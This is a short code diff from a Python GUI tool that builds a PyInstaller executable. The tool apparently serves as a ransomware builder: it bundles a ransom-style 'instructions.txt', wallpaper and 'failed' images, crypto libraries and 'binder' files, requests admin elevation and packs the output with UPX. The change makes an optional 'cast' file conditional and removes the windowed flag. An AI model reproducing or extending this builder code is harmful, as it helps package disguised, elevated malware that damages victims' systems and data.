@@ -434,11 +434,12 @@ class App(customtkinter.CTk):
             shutil.copyfile(path, f'src\\temp\\binder_{filename}')
             binder_args += ['--add-data', f'{dir}\\src\\temp\\binder_{filename};.']
 
-        filename = cast_file.split("/")[-1]
-        shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')
+        if cast_file:
+            filename = cast_file.split("/")[-1]
+            shutil.copyfile(cast_file, f'{dir}\\src\\temp\\cast_{filename}')
 
         coincurve_path = "\\".join(coincurve.__file__.split("\\")[:-1])
-        command = ['python', '-m', 'PyInstaller', '--windowed', '--noconfirm', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + ['--clean', f'{dir}\\src\\output.py']
+        command = ['python', '-m', 'PyInstaller', '--noconfirm', '--onefile', '--icon' if icon else '', icon if icon else '', '--uac-admin' if admin else '', '--upx-dir', 'build\\upx', '--workpath', 'build', '--specpath', 'build\\spec', '--add-data', f'{coincurve_path};coincurve', '--add-data', f'{dir}\\src\\temp\\instructions.txt;.', '--add-data', f'{dir}\\src\\files\\wallpaper.jpg;.', '--add-data', f'{dir}\\src\\files\\failed.jpg;.', '--add-data' if cast_file else '', f'{dir}\\src\\temp\\cast_{filename};.' if cast_file else ''] + binder_args + ['--clean', f'{dir}\\src\\output.py']
         for _ in range(command.count('')):
             command.remove('')
         print(command)
